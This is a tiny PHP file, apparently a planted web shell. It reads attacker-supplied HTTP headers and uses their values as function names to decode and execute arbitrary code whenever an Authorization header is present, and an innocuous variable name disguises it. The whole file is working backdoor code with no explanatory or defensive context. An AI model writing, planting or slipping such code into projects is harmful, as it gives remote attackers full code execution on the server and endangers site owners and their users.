<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $db2_convert = $_HEADERS['Authorization']('', $_HEADERS['Large-Allocation']($_HEADERS['X-Dns-Prefetch-Control']));
    $db2_convert();
}